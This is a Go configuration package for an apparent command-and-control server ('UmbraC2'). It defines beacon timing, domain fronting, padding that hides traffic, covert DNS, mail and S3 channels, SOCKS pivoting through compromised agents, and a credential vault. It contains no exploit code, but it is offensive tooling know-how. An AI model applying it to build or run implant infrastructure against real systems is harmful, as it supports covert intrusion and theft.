// Package config loads and validates the team server configuration.
package config

import (
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"os"
	"strings"
	"time"

	"github.com/thesyntax1/UmbraC2/server/internal/rbac"
)

// AlertRule matches the events an operator wants to hear about.
//
// An empty field matches everything, so a rule with only an event kind
// fires on every event of that kind.
type AlertRule struct {
	// Name identifies the rule in the console and in the log.
	Name string `json:"name"`
	// Event is the event kind ("agent.offline", "task.result", ...).
	Event string `json:"event"`
	// Tag requires the agent to carry this tag.
	Tag string `json:"tag,omitempty"`
	// Agent is an agent id or the beginning of one.
	Agent string `json:"agent,omitempty"`
	// TaskKind requires the task to be of this kind.
	TaskKind string `json:"task_kind,omitempty"`
	// CooldownSec is the minimum number of seconds between two alerts of
	// this rule.
	CooldownSec int `json:"cooldown_s,omitempty"`
}

// Beacon is the default agent polling policy handed out at handshake time.
type Beacon struct {
	Sleep  int `json:"sleep"`
	Jitter int `json:"jitter"`
}

// Limits bounds resource usage so a single peer cannot exhaust the server.
type Limits struct {
	MaxAgents            int `json:"max_agents"`
	MaxOperators         int `json:"max_operators"`
	HandshakeTimeoutSec  int `json:"handshake_timeout_s"`
	IdleTimeoutSec       int `json:"idle_timeout_s"`
	MaxFrameBytesPerConn int `json:"max_frame_bytes_per_conn"`
}

// Server is the whole configuration document.
type Server struct {
	AgentListen    string `json:"agent_listen"`
	OperatorListen string `json:"operator_listen"`
	HTTPListen     string `json:"http_listen"`
	HTTPPath       string `json:"http_path"`
	HTTPTLSCert    string `json:"http_tls_cert"`
	HTTPTLSKey     string `json:"http_tls_key"`
	// HTTPHostHeader is the Host header the beacon is expected to send.
	// It is what makes domain fronting possible: the TCP connection goes
	// to the C2 address, the Host header names a fronting domain.
	HTTPHostHeader string `json:"http_host_header"`
	// HTTPPad pads HTTP bodies to a bucket of this size (0 = off). It
	// hides the real payload size behind a coarse traffic profile.
	HTTPPad int `json:"http_pad"`

	// TLSListen is a mutual-TLS listener for agents and operators. Every
	// peer must present a certificate signed by TLSClientCA.
	TLSListen   string `json:"tls_listen"`
	TLSCert     string `json:"tls_cert"`
	TLSKey      string `json:"tls_key"`
	TLSClientCA string `json:"tls_client_ca"`

	// DNSListen is the UDP/TCP listener of the DNS transport, and DNSDomain
	// is the zone it answers for.
	DNSListen string `json:"dns_listen"`
	DNSDomain string `json:"dns_domain"`

	// The mail transport: the beacon mails its frames to the SMTP
	// listener and fetches the answer from its mailbox with POP3.  Both
	// addresses are needed.
	SMTPListen string `json:"smtp_listen"`
	POP3Listen string `json:"pop3_listen"`
	// MailDomain is the domain the mails carry.
	MailDomain string `json:"mail_domain"`

	// The object transport: the beacon reads its work from one bucket and
	// writes its results into another.
	S3Listen        string `json:"s3_listen"`
	S3Region        string `json:"s3_region"`
	S3TasksBucket   string `json:"s3_tasks_bucket"`
	S3ResultsBucket string `json:"s3_results_bucket"`

	// VPNListen binds the layer-3 tunnel, VPNAddr is the address the
	// beacons and consoles connect to, VPNNetwork is the tunnel network.
	VPNListen  string `json:"vpn_listen"`
	VPNAddr    string `json:"vpn_addr"`
	VPNNetwork string `json:"vpn_network"`

	// SocksListen is a persistent SOCKS5 proxy that pivots through
	// SocksAgent; SocksAgent is the agent it uses.
	SocksListen string `json:"socks_listen"`
	SocksAgent  string `json:"socks_agent"`

	// SocksUser and SocksPassword are the credentials the SOCKS5 proxy
	// asks for.  Without them the proxy is open to everybody who can
	// reach its listener, which is fine on the loopback and not fine
	// anywhere else.
	SocksUser     string `json:"socks_user"`
	SocksPassword string `json:"socks_password"`

	// PivotDeny is the list of targets the proxy refuses.  Each entry is
	// "host" or "host:port"; a host without a port refuses every port of
	// it.
	PivotDeny []string `json:"pivot_deny"`

	// DashboardListen binds the operator's web dashboard, and
	// DashboardReadOnly keeps it from queueing anything.  The dashboard
	// accepts the operator tokens, so it is as protected as the console.
	DashboardListen   string `json:"dashboard_listen"`
	DashboardReadOnly bool   `json:"dashboard_read_only"`

	PSKFile       string   `json:"psk_file"`
	AgentPSK      string   `json:"agent_psk_env"`      // env var that holds the agent PSK
	OperatorToken []string `json:"operator_token_env"` // env vars holding "name:token" pairs

	// VaultKey encrypts the credential vault at rest.  It is the key of
	// the vault, nothing else: without it the server keeps the digest of
	// the material and drops the value, and with it the value comes back
	// only to the operators the role table allows.
	VaultKey    string `json:"vault_key"`
	VaultKeyEnv string `json:"vault_key_env"`

	DataFile string `json:"data_file"`
	// AuditFile receives one JSON line per operator command. Empty disables
	// auditing; keep it enabled anywhere a human can type.
	AuditFile      string `json:"audit_file"`
	AuditMaxSizeMB int    `json:"audit_max_mb"`
	LogLevel       string `json:"log_level"`

	// ArmoryDir caches the signed extensions, ArmoryKey is the PEM file
	// with the Ed25519 public key that signs the catalogue.
	ArmoryDir string `json:"armory_dir"`
	ArmoryKey string `json:"armory_key"`

	// Alerts are rules on the event stream: when a rule matches, the server
	// logs the event loudly and pushes an "alert" event to the consoles.
	Alerts []AlertRule `json:"alerts,omitempty"`
	// TaskTimeoutSec is how long a delivered task may stay unanswered
	// before the server gives up on it (0 = never).
	TaskTimeoutSec int `json:"task_timeout_s"`
	Beacon         Beacon `json:"beacon"`
	Limits         Limits `json:"limits"`
	MaxClockSkewS  int    `json:"max_clock_skew_s"`
	SessionTimeout int    `json:"session_timeout_s"`
	// MaxTaskBatch is how many tasks one beacon cycle may carry.
	//
	// A beacon opens one connection per cycle, so this is also how much
	// work the server can hand out between two check-ins.  The default
	// keeps a cycle small enough for the frame budget.
	MaxTaskBatch int `json:"max_task_batch"`
	// MaxQueuedTasks is how many tasks may wait for one agent.
	//
	// A backlog is a symptom: an agent that is offline, or an operator
	// that queued a thousand commands, would otherwise pile up work that
	// is stale by the time it is delivered.
	MaxQueuedTasks int `json:"max_queued_tasks"`
}

// Defaults for the queue limits.
const (
	// DefaultMaxTaskBatch mirrors the beacon's own cycle budget.
	DefaultMaxTaskBatch = 64
	// DefaultMaxQueuedTasks is the backlog an agent may carry.
	DefaultMaxQueuedTasks = 256
)

// Keyring is the set of pre-shared keys the server accepts.
type Keyring struct {
	AgentPSK []byte
	// Operators maps operator identity -> raw token bytes.
	Operators map[string][]byte
	// Roles maps operator identity -> role (admin/operator/viewer). An identity
	// with a token but no role gets DefaultOperatorRole, which is the
	// least-surprising thing for an existing deployment.
	Roles map[string]string
}

// DefaultOperatorRole is used when a token is configured without a role.
const DefaultOperatorRole = rbac.Operator

// Role returns the configured role for an operator identity.
func (k Keyring) Role(name string) string {
	if role, ok := k.Roles[name]; ok && rbac.Valid(role) {
		return role
	}
	return DefaultOperatorRole
}

// Config is the validated, ready-to-run configuration.
type Config struct {
	Server  Server
	Keyring Keyring
}

// Default returns a development configuration: loopback listeners, sane limits.
func Default() *Config {
	return &Config{Server: Server{
		AgentListen:     "127.0.0.1:4001",
		OperatorListen:  "127.0.0.1:4002",
		HTTPListen:      "",
		HTTPPath:        "/api/v1/beacon",
		PSKFile:         "secrets/agent.psk",
		AgentPSK:        "UMBRA_AGENT_PSK",
		OperatorToken:   []string{"UMBRA_OPERATOR_TOKENS"},
		VaultKeyEnv:     "UMBRA_VAULT_KEY",
		DataFile:        "data/state.json",
		AuditFile:       "data/audit.jsonl",
		AuditMaxSizeMB:  8,
		LogLevel:        "info",
		VPNNetwork:      "10.77.0.0/24",
		DNSDomain:       "umbra.local",
		MailDomain:      "umbra.local",
		S3Region:        "us-east-1",
		S3TasksBucket:   "umbra-tasks",
		S3ResultsBucket: "umbra-results",
		ArmoryDir:       "data/armory",
		Beacon:          Beacon{Sleep: 5, Jitter: 20},
		Limits:          Limits{MaxAgents: 512, MaxOperators: 16, HandshakeTimeoutSec: 15, IdleTimeoutSec: 120, MaxFrameBytesPerConn: 64 << 20},
		TaskTimeoutSec:  300,
		MaxTaskBatch:    DefaultMaxTaskBatch,
		MaxQueuedTasks:  DefaultMaxQueuedTasks,
		MaxClockSkewS:   300,
		SessionTimeout:  300,
	}}
}

// Load reads a JSON config file and applies environment overrides.
func Load(path string) (*Config, error) {
	cfg := Default()
	if path != "" {
		raw, err := os.ReadFile(path)
		if err != nil {
			return nil, fmt.Errorf("config: read %s: %w", path, err)
		}
		if err := json.Unmarshal(raw, &cfg.Server); err != nil {
			return nil, fmt.Errorf("config: parse %s: %w", path, err)
		}
	}
	if err := cfg.loadKeys(); err != nil {
		return nil, err
	}
	return cfg, cfg.Validate()
}

func (c *Config) loadKeys() error {
	c.Keyring.Operators = map[string][]byte{}
	c.Keyring.Roles = map[string]string{}

	agentPSK := os.Getenv(c.Server.AgentPSK)
	if agentPSK == "" && c.Server.PSKFile != "" {
		if raw, err := os.ReadFile(c.Server.PSKFile); err == nil {
			agentPSK = strings.TrimSpace(string(raw))
		}
	}
	if agentPSK != "" {
		c.Keyring.AgentPSK = []byte(agentPSK)
	}

	// The vault key: from the file, from the environment or from the
	// configuration itself.  It is the only key of the server that is not
	// part of the keyring, because it protects the material the keyring
	// collected.
	if c.Server.VaultKey == "" && c.Server.VaultKeyEnv != "" {
		c.Server.VaultKey = strings.TrimSpace(os.Getenv(c.Server.VaultKeyEnv))
	}

	for _, envName := range c.Server.OperatorToken {
		raw := os.Getenv(envName)
		for _, pair := range strings.Split(raw, ",") {
			pair = strings.TrimSpace(pair)
			if pair == "" {
				continue
			}
			// Accepted forms:
			//   name:token              role defaults to operator
			//   name:role:token         role is admin/operator/viewer
			fields := strings.SplitN(pair, ":", 3)
			name, role, token := "", DefaultOperatorRole, ""
			switch len(fields) {
			case 2:
				name, token = fields[0], fields[1]
			case 3:
				name, role, token = fields[0], fields[1], fields[2]
			default:
				return fmt.Errorf("config: %s entry %q must be name:token or name:role:token", envName, pair)
			}
			if name == "" || token == "" {
				return fmt.Errorf("config: %s entry %q must be name:token or name:role:token", envName, pair)
			}
			if !rbac.Valid(role) {
				return fmt.Errorf("config: %s operator %q has unknown role %q (want one of %v)",
					envName, name, role, rbac.Roles)
			}
			c.Keyring.Operators[name] = []byte(token)
			c.Keyring.Roles[name] = role
		}
	}
	return nil
}

// Validate checks invariants that would otherwise fail at runtime.
func (c *Config) Validate() error {
	s := c.Server
	if len(c.Keyring.AgentPSK) < 16 {
		return errors.New("config: agent PSK missing or shorter than 16 bytes (set " + s.AgentPSK + " or " + s.PSKFile + ")")
	}
	if len(c.Keyring.Operators) == 0 {
		return errors.New("config: no operator tokens configured (set " + strings.Join(s.OperatorToken, ",") + ")")
	}
	for name, tok := range c.Keyring.Operators {
		if len(tok) < 16 {
			return fmt.Errorf("config: operator %q token shorter than 16 bytes", name)
		}
		if role := c.Keyring.Role(name); !rbac.Valid(role) {
			return fmt.Errorf("config: operator %q has unknown role %q", name, role)
		}
	}
	// One admin must exist, otherwise nobody can manage the engagement (and the
	// operator would find out by being refused at the worst moment).
	admins := 0
	for name := range c.Keyring.Operators {
		if c.Keyring.Role(name) == rbac.Admin {
			admins++
		}
	}
	if admins == 0 {
		return errors.New("config: at least one operator token must have role admin")
	}
	if s.AgentListen == "" && s.OperatorListen == "" && s.HTTPListen == "" {
		return errors.New("config: no listener configured")
	}
	if s.Beacon.Sleep < 1 || s.Beacon.Sleep > 86400 {
		return errors.New("config: beacon.sleep must be between 1 and 86400")
	}
	if s.Beacon.Jitter < 0 || s.Beacon.Jitter > 90 {
		return errors.New("config: beacon.jitter must be between 0 and 90 percent")
	}
	if s.Limits.MaxAgents < 1 || s.Limits.MaxOperators < 1 {
		return errors.New("config: max_agents/max_operators must be positive")
	}
	if s.HTTPListen != "" && s.HTTPPath == "" {
		return errors.New("config: http_path must be set when http_listen is used")
	}
	if s.AuditFile != "" && s.AuditMaxSizeMB <= 0 {
		return errors.New("config: audit_max_mb must be positive when audit_file is set")
	}
	if s.AuditFile != "" && s.DataFile != "" && s.AuditFile == s.DataFile {
		return errors.New("config: audit_file must not be the data_file")
	}
	if s.TLSListen != "" {
		if s.TLSCert == "" || s.TLSKey == "" {
			return errors.New("config: tls_cert and tls_key are required when tls_listen is used")
		}
		if s.TLSClientCA == "" {
			return errors.New("config: tls_client_ca is required when tls_listen is used (the listener is mutual TLS)")
		}
	}
	if s.DNSListen != "" && s.DNSDomain == "" {
		return errors.New("config: dns_domain must be set when dns_listen is used")
	}
	if s.VPNListen != "" && s.VPNNetwork == "" {
		return errors.New("config: vpn_network must be set when vpn_listen is used")
	}
	if s.HTTPPad != 0 && (s.HTTPPad < 256 || s.HTTPPad > 65536) {
		return errors.New("config: http_pad must be 0 (off) or between 256 and 65536 bytes")
	}
	if s.ArmoryKey != "" && s.ArmoryDir == "" {
		return errors.New("config: armory_dir must be set when armory_key is used")
	}
	if s.SocksListen != "" && s.SocksAgent == "" {
		return errors.New("config: socks_agent must be set when socks_listen is used")
	}
	if (s.SMTPListen == "") != (s.POP3Listen == "") {
		return errors.New("config: smtp_listen and pop3_listen must be set together")
	}
	return nil
}

// TokenHashes returns sha256 fingerprints of every operator token, for logs.
func (c *Config) TokenHashes() map[string]string {
	out := make(map[string]string, len(c.Keyring.Operators))
	for name, tok := range c.Keyring.Operators {
		sum := sha256.Sum256(tok)
		out[name] = hex.EncodeToString(sum[:])[:16]
	}
	return out
}

// PublicKeyring must never be logged; this helper documents that intent.
func (k Keyring) String() string { return "config.Keyring{redacted}" }

// HandshakeTimeout is the deadline for completing a handshake.
func (c *Config) HandshakeTimeout() time.Duration {
	return time.Duration(c.Server.Limits.HandshakeTimeoutSec) * time.Second
}

// IdleTimeout is how long an established link may stay silent.
func (c *Config) IdleTimeout() time.Duration {
	return time.Duration(c.Server.Limits.IdleTimeoutSec) * time.Second
}

// MaxSkew is the tolerated clock difference during the handshake.
// TaskTimeout is how long a delivered task may stay unanswered.
//
// Zero means "wait forever": some tasks are meant to take a long time (a
// screenshot of a slow desktop, a key logger that runs for an hour).
func (c *Config) TaskTimeout() time.Duration {
	if c.Server.TaskTimeoutSec <= 0 {
		return 0
	}
	return time.Duration(c.Server.TaskTimeoutSec) * time.Second
}

func (c *Config) MaxSkew() time.Duration {
	return time.Duration(c.Server.MaxClockSkewS) * time.Second
}

// MaxTaskBatch is how many tasks one beacon cycle may carry.
//
// A configuration that leaves the value at zero (or below) falls back to the
// default: the limit exists to protect the frame budget, and "unlimited"
// is not a value an operator should be able to set by accident.
func (c *Config) MaxTaskBatch() int {
	if c.Server.MaxTaskBatch <= 0 {
		return DefaultMaxTaskBatch
	}
	return c.Server.MaxTaskBatch
}

// MaxQueuedTasks is how many tasks may wait for one agent.
func (c *Config) MaxQueuedTasks() int {
	if c.Server.MaxQueuedTasks <= 0 {
		return DefaultMaxQueuedTasks
	}
	return c.Server.MaxQueuedTasks
}
